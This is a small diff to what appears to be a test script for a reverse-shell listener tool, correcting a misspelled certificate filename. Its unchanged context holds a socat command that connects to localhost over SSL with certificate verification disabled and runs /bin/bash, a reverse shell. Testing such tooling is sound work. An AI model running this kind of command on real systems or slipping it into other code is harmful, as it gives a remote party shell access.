@@ -1,6 +1,6 @@
 
 # test ssh reverse shell without any authentication
-listen -b 4444 --protocol ssl --cert test/certs/cert-lcoalhost1.pem --key test/certs/key-localhost1.pem
+listen -b 4444 --protocol ssl --cert test/certs/cert-localhost1.pem --key test/certs/key-localhost1.pem
 
 socat OPENSSL:localhost:4444,verify=0 EXEC:/bin/bash
 
